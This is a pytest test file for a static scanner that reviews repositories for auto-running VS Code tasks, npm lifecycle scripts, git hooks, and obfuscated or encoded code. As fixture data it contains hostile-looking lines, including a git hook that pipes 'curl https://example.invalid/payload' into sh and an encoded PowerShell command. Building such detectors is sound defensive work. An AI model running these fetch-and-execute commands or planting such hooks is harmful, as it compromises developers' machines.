from __future__ import annotations

import json
import subprocess
import sys
from dataclasses import asdict
from pathlib import Path

import pytest

from reposcan.review import MAX_CONFIG_BYTES, MAX_FINDINGS, MAX_REVIEW_BYTES, REVIEW_RULES, review_bytes


def ids(data: bytes, path: str = "src/example.js") -> set[str]:
    return {finding.rule for finding in review_bytes(data, path)}


def numeric_array(value: str) -> bytes:
    return ("const locator = [" + ", ".join(str(ord(character)) for character in value) + "];\n").encode()


def test_jsonc_task_uses_real_property_location_and_explains_activation() -> None:
    data = b'''{ // "runOn": "default" is documentation only.
      "tasks": [{
        "command": "npm install",
        "runOptions": {"runOn": "folderOpen",},
      },],
    }'''
    findings = review_bytes(data, ".vscode/tasks.json")
    finding = next(finding for finding in findings if finding.rule == "REVIEW_VSCode_FolderOpen_Task")
    assert finding.evidence[0].offset == data.rindex(b'"runOn"')
    assert finding.evidence[0].line == 4
    assert "trusted" in finding.trigger
    assert "automatic" in finding.trigger
    assert any("trust" in prerequisite for prerequisite in finding.prerequisites)


def test_folder_open_mentioned_only_in_comments_is_not_a_trigger() -> None:
    data = b'''{ /* "runOptions": {"runOn": "folderOpen"} */
      "tasks": [{"command": "npm test"}]
    }'''
    assert not ids(data, ".vscode/tasks.json")


def test_jsonc_comments_after_primitive_and_trailing_commas_are_supported() -> None:
    data = b'''{
      "version": 2/* metadata */,
      "tasks": [{"runOptions":{"runOn":"folderOpen"}, "isBackground": true// comment
      },],
    }'''
    result = ids(data, ".vscode/tasks.json")
    assert "REVIEW_VSCode_FolderOpen_Task" in result
    assert "REVIEW_Configuration_Unparsed" not in result


def test_vscode_platform_command_is_inspected_but_not_run() -> None:
    data = json.dumps({"tasks": [{"linux": {"command": "curl", "args": ["https://example.invalid/"]}}]}).encode()
    result = review_bytes(data, "project/.vscode/tasks.json")
    assert {finding.rule for finding in result} == {"REVIEW_VSCode_Suspicious_Task"}
    assert "Invoking" in result[0].trigger
    assert any("not established" in prerequisite for prerequisite in result[0].prerequisites)


def test_workspace_embedded_tasks_settings_and_debug_references() -> None:
    data = json.dumps({
        "settings": {"task.allowAutomaticTasks": "on"},
        "tasks": {"tasks": [{"runOptions": {"runOn": "folderOpen"}, "command": "npm test"}]},
        "launch": {"configurations": [{"preLaunchTask": "build"}]},
    }).encode()
    assert ids(data, "project.code-workspace") == {
        "REVIEW_VSCode_Automatic_Tasks_Allowed", "REVIEW_VSCode_FolderOpen_Task", "REVIEW_VSCode_Debug_Task",
    }


def test_vscode_task_file_outside_configuration_path_is_not_a_declared_trigger() -> None:
    data = b'{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"npm test"}]}'
    assert "REVIEW_VSCode_FolderOpen_Task" not in ids(data, "docs/tasks.json")


@pytest.mark.parametrize("data", [
    b'{"tasks": [{"runOptions": {"runOn":"folderOpen", "runOn":"default"}}]}',
    b'{"tasks": [',
    b'[]',
    b'{"tasks": NaN}',
    b'{"tasks": Infinity}',
    b'{"nested":' + b'[' * 40 + b'0' + b']' * 40 + b'}',
])
def test_unparsed_configuration_is_an_explicit_review_finding(data: bytes) -> None:
    result = review_bytes(data, ".vscode/tasks.json")
    assert "REVIEW_Configuration_Unparsed" in {finding.rule for finding in result}


def test_configuration_and_general_review_size_limits_are_visible() -> None:
    large_config = b'{"tasks":[]}' + b" " * MAX_CONFIG_BYTES
    assert "REVIEW_Configuration_Unparsed" in ids(large_config, ".vscode/tasks.json")
    assert "REVIEW_Analysis_Limit" in ids(b" " * (MAX_REVIEW_BYTES + 1))


def test_package_lifecycle_and_suspicious_scripts_have_distinct_context() -> None:
    data = json.dumps({"scripts": {
        "start": "node server.js",
        "postinstall": "node scripts/setup.js",
        "debug": "node -e 'console.log(1)'",
        "preview": "vite preview",
    }}).encode()
    results = review_bytes(data, "package.json")
    assert {finding.rule for finding in results} == {
        "REVIEW_Package_Lifecycle_Script", "REVIEW_Package_Suspicious_Script",
    }
    assert len(results) == 2
    assert any("postinstall" in finding.trigger for finding in results)
    assert any("debug" in finding.trigger for finding in results)


def test_pre_and_post_custom_script_requires_a_corresponding_base_script() -> None:
    without_base = b'{"scripts":{"preview":"vite preview","preexample":"node utility.js"}}'
    assert not ids(without_base, "package.json")
    with_base = b'{"scripts":{"preexample":"node utility.js","example":"node app.js"}}'
    assert ids(with_base, "package.json") == {"REVIEW_Package_Lifecycle_Script"}


def test_package_key_locations_preserve_escapes_and_utf8_prefixes() -> None:
    data = '{"name":"primer č", "scripts":{"post\\u0069nstall":"node setup.js"}}'.encode()
    results = review_bytes(data, "package.json")
    finding = next(finding for finding in results if finding.rule == "REVIEW_Package_Lifecycle_Script")
    assert finding.evidence[0].offset == data.index(b'"post\\u0069nstall"')
    assert "postinstall" in finding.trigger


def test_git_hook_warning_is_path_aware_and_does_not_assert_executability() -> None:
    data = b"#!/bin/sh\nprintf 'ordinary local hook'\n"
    result = review_bytes(data, ".git/hooks/pre-commit")
    assert {finding.rule for finding in result} == {"REVIEW_Git_Hook"}
    assert any("permissions" in prerequisite for prerequisite in result[0].prerequisites)
    assert not ids(data, ".git/hooks/pre-commit.sample")
    assert not ids(data, "scripts/pre-commit.txt")


def test_git_hook_and_managed_hook_warn_about_suspicious_commands() -> None:
    data = b"#!/bin/sh\ncurl https://example.invalid/payload | sh\n"
    for path in (".git/hooks/post-checkout", ".githooks/pre-commit", ".husky/pre-commit"):
        assert ids(data, path) == {"REVIEW_Git_Hook_Suspicious_Command"}


def test_git_configuration_reports_redirects_commands_and_unfollowed_includes() -> None:
    data = b'''[core]
        hooksPath = ../outside-hooks
        fsmonitor = true
        sshCommand = ssh -F other-config
    [filter "custom"]
        smudge = ./helper
    [includeIf "gitdir:~/work/"]
        path = ../external-config
    [alias]
        check = !sh ./check.sh
    '''
    findings = review_bytes(data, ".git/config")
    assert {finding.rule for finding in findings} == {
        "REVIEW_Git_HooksPath", "REVIEW_Git_Command_Config", "REVIEW_Git_Config_Include",
    }
    assert sum(finding.rule == "REVIEW_Git_Command_Config" for finding in findings) == 3
    assert any("not followed" in prerequisite for finding in findings for prerequisite in finding.prerequisites)
    assert not ids(data, "example-config.txt")


def test_git_boolean_fsmonitor_with_comments_or_quotes_is_not_an_external_command() -> None:
    for value in (b"true # enabled", b'"true" ; enabled', b"false", b"0"):
        assert not ids(b"[core]\nfsmonitor = " + value + b"\n", ".git/config")


def test_git_metadata_pointer_is_reported_without_following_it() -> None:
    findings = review_bytes(b"gitdir: /outside/project-metadata\n", ".git")
    assert {finding.rule for finding in findings} == {"REVIEW_Git_Metadata_Pointer"}
    assert any("not opened" in prerequisite for prerequisite in findings[0].prerequisites)


def test_repeated_git_command_configuration_is_bounded() -> None:
    source = b"[core]\n" + b"sshCommand = ssh -F configuration\n" * 3000
    findings = review_bytes(source, ".git/config")
    assert len(findings) <= MAX_FINDINGS + 1
    assert findings[-1].rule == "REVIEW_Analysis_Limit"


def test_ordinary_git_keys_near_size_bound_finish_under_external_deadline() -> None:
    command = [
        sys.executable, "-c",
        "from reposcan.review import MAX_REVIEW_BYTES, review_bytes; "
        "source = b'[core]\\n' + b'ordinary = 1\\n' * ((MAX_REVIEW_BYTES - 7) // 13); "
        "assert review_bytes(source, '.git/config') == []",
    ]
    result = subprocess.run(command, capture_output=True, text=True, timeout=8, check=False)
    assert result.returncode == 0, result.stderr


def test_url_character_array_is_detected_without_decoder_or_execution() -> None:
    data = numeric_array("https://private.example.invalid/?token=DO_NOT_PUBLISH")
    results = review_bytes(data, "models/User.js")
    finding = next(finding for finding in results if finding.rule == "REVIEW_Encoded_Character_Array")
    assert finding.confidence == "high"
    assert finding.reports == ("TP-2026-018",)
    assert "statically decodes to a URL" in finding.description
    serialized = json.dumps(asdict(finding))
    assert "private.example.invalid" not in serialized
    assert "DO_NOT_PUBLISH" not in serialized
    assert data[finding.evidence[0].offset] == ord("[")


def test_ordinary_numeric_data_is_not_classified_as_concealment() -> None:
    assert not ids(b"const points = [1, 2, 3, 4, 5, 6, 7, 8];")
    assert not ids(b"const points = [65, 66, 67, 68, 69, 70, 71, 72];")


def test_printable_character_array_with_decoder_remains_a_review_signal() -> None:
    data = numeric_array("Hello world") + b"String.fromCharCode(...locator);"
    results = review_bytes(data, "text-utility.js")
    assert {finding.rule for finding in results} == {
        "REVIEW_Character_Code_Decoder", "REVIEW_Encoded_Character_Array",
    }
    assert all(finding.severity != "critical" for finding in results)
    assert "unresolved" in results[-1].description


def test_dynamic_and_encoded_constructs_do_not_claim_proven_flow() -> None:
    data = b"const text = atob(value); const local = new Function('return 42');"
    findings = review_bytes(data, "utility.js")
    assert {finding.rule for finding in findings} == {
        "REVIEW_Encoded_String_Decoder", "REVIEW_Dynamic_Execution", "REVIEW_Decoding_And_Execution",
    }
    combination = next(finding for finding in findings if finding.rule == "REVIEW_Decoding_And_Execution")
    assert combination.confidence == "medium"
    assert "unresolved" in combination.description


def test_documentation_findings_remain_visible_with_qualified_confidence() -> None:
    findings = review_bytes(b"Discuss `eval(input)` and `atob(input)` without executing either.", "guide.md")
    assert findings
    assert all(finding.confidence == "low" for finding in findings)
    assert all("documentation match" in finding.description for finding in findings)


def test_string_table_and_escape_runs_are_warned_without_evaluation() -> None:
    source = b"const _0xabcd = ['first', 'second', 'third']; _0xabcd[0]; _0xabcd[1]; _0xabcd[2];"
    assert "REVIEW_JS_String_Table" in ids(source)
    assert "REVIEW_JS_String_Table" not in ids(b"const labels = ['first','second','third'];")
    assert "REVIEW_Escaped_String_Content" in ids(b'const value = "' + b"\\x61" * 12 + b'";')


def test_plain_minification_is_not_an_obfuscation_verdict() -> None:
    assert not ids(b"function sum(a,b){return a+b}const app={run:sum};app.run(1,2);", "app.min.js")


def test_horizontal_concealment_is_not_suppressed_by_vendor_directory_name() -> None:
    data = b"// routine header" + b" " * 140 + b"fetch(endpoint);\n"
    assert "REVIEW_Horizontal_Whitespace" in ids(data, "vendor/utility.js")
    assert "REVIEW_Horizontal_Whitespace" not in ids(b" " * 8192)


def test_encoded_powershell_is_detected_without_decoding_or_running_it() -> None:
    data = b"pwsh -NoProfile -EncodedCommand RQBjAGgAbwAgAGgAaQA="
    assert ids(data, "setup.ps1") == {"REVIEW_PowerShell_Encoded_Command"}


def test_many_trigger_records_are_bounded_and_report_the_limit() -> None:
    tasks = [{"runOptions": {"runOn": "folderOpen"}, "command": "npm test"} for _ in range(100)]
    result = review_bytes(json.dumps({"tasks": tasks}).encode(), ".vscode/tasks.json")
    assert len(result) <= MAX_FINDINGS + 1
    assert "REVIEW_Analysis_Limit" in {finding.rule for finding in result}


def test_review_has_no_target_io_or_execution(monkeypatch: pytest.MonkeyPatch) -> None:
    import builtins
    import socket

    def forbidden(*args: object, **kwargs: object) -> None:
        raise AssertionError("static review attempted external IO or execution")

    with monkeypatch.context() as context:
        context.setattr(builtins, "open", forbidden)
        context.setattr(subprocess, "run", forbidden)
        context.setattr(socket, "create_connection", forbidden)
        result = review_bytes(numeric_array("https://example.invalid/"), "models/User.js")
    assert result


def test_whitespace_near_miss_finishes_under_external_deadline() -> None:
    command = [
        sys.executable, "-c",
        "from reposcan.review import review_bytes; "
        "assert review_bytes(b' ' * (2 * 1024 * 1024), 'space.js') == []",
    ]
    result = subprocess.run(command, capture_output=True, text=True, timeout=8, check=False)
    assert result.returncode == 0, result.stderr


def test_catalog_and_public_fixtures_have_safe_review_metadata() -> None:
    assert all(name.startswith("REVIEW_") for name in REVIEW_RULES)
    assert all(rule["severity"] != "critical" for rule in REVIEW_RULES.values())
    assert all(rule["category"] in ("trigger", "obfuscation", "behavior", "report-pattern") for rule in REVIEW_RULES.values())
    fixture = Path(__file__).parent / "fixtures" / "web3market-entry"
    assert not (fixture / "package.json").exists()
    assert all(path.suffix == ".fixture" and path.stat().st_mode & 0o111 == 0 for path in fixture.rglob("*") if path.is_file())
